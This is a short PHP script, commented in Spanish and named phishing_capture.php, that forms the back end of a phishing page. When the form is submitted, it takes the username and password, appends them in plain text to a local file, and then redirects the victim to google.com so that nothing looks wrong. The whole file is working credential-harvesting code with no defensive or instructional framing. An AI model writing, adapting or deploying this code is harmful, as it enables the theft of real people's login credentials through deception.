<?php
// Archivo: phishing_capture.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Guarda las credenciales en un archivo local
    $file = fopen("captured_data.txt", "a");
    fwrite($file, "Usuario: $username | Contraseña: $password\n");
    fclose($file);

    // Redirige a una página "legítima"
    header("Location: https://google.com");
    exit;
}
?>
